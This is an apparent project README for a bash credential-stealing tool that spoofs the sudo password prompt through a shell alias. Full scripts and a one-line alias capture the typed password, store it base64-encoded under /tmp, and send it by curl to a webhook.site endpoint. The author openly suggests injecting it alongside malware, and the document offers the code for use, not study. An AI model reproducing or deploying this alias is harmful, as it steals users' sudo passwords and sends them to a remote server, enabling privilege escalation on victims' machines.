# terminal-phising 🕵️‍♀️ 🕵
Terminal passwod steal
can be injected with alias when su run in terminal it activate this script 

## use webhook.site for sending out the password as request value 
this script also saved the password at /tmp/ file named with random and the linux username at the start $whoami

this 2 script very simple and easy to write and use in bash it can be useful with a kind of malware that infected users using inject this file using alias via sudo su command for activate the fake script :)  

## to replace the script with sudo we can use alias 
```bash
alias sudo='./patch-to-scritp'
```
## for remove use the sudo replaced or any other command used for phising 
```bash
unalias sudo 
```

## so just another way kind of working the same but without bash file needed in the system this one can be injected using alias only
code it self: 
```bash
stored_password=$(
  dir="/tmp/$USER-$(date +%s%N)"
  mkdir -p "$dir"
  file="$dir/content.txt"
  read -s -p "[sudo] password for $(whoami): " user_password
  echo "$user_password" | base64 > "$file"
  cat "$file" | base64 -d

  # Send the base64-encoded password to webhook.site as a POST request
  webhook_url="https://webhook.site/aaaaaa-aaa-aaa-aaaa-186aaaa034"  # Replace with your webhook URL
  encoded_password=$(echo -n "$user_password" | base64)
  curl -X POST -d "content=$encoded_password" "$webhook_url" >/dev/null 2>&1
)
```
so using this code you can inject it to an alias called sudo and by typing sudo it activate background code (the code) that save the password in file stored inside /tmp start with username who run the script like /tmp/$USER or /tmp/sudo and send the password typed to remote server we used [Webhook site](https://webhook.site) for this case. here is example of command to replace sudo with the backdoored sudo command:  
```bash
alias sudo='stored_password=$(dir="/tmp/$USER-$(date +%s%N)" && mkdir -p "$dir" && file="$dir/content.txt" && read -s -p "[sudo] password for $(whoami): " user_password && echo "$user_password" | base64 > "$file" && cat "$file" | base64 -d && webhook_url="https://webhook.site/a13a3530-7084-4f04-b0d6-186f5f832034" && encoded_password=$(echo -n "$user_password" | base64) && curl -X POST -d "content=$encoded_password" "$webhook_url" >/dev/null 2>&1); echo'

```
